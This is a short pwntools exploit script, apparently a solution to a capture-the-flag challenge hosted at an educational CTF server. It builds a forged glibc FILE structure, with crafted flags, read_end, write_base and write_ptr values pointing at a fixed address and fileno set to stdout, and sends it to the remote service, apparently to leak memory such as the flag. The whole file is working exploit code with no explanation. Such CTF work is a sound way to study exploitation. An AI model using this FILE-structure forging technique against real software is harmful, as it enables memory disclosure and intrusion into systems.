from pwn import *

context.clear( arch = 'amd64' )

p = remote( 'edu-ctf.zoolab.org', 10010 )
# p = process('./chal')

flag = 0
flag &= ~0x8
flag |= ( 0xFBAD0000 | 0x800 )
print( hex( flag ) )
fileno = 0x1
write_end = 0
read_end = 0x404050
write_base = 0x404050
write_ptr = 0x404050 + 0x10

payload = 3 * p64(0) + p64(0x1e1)
payload += p64( flag )
payload += p64(0)
payload += p64( read_end )
payload += p64(0)
payload += p64( write_base )
payload += p64( write_ptr )
payload += p64( write_end )
payload += p64(0) * 7
payload += p64( fileno )

# gdb.attach(p)
# input('>')
p.sendline( payload )

p.interactive()
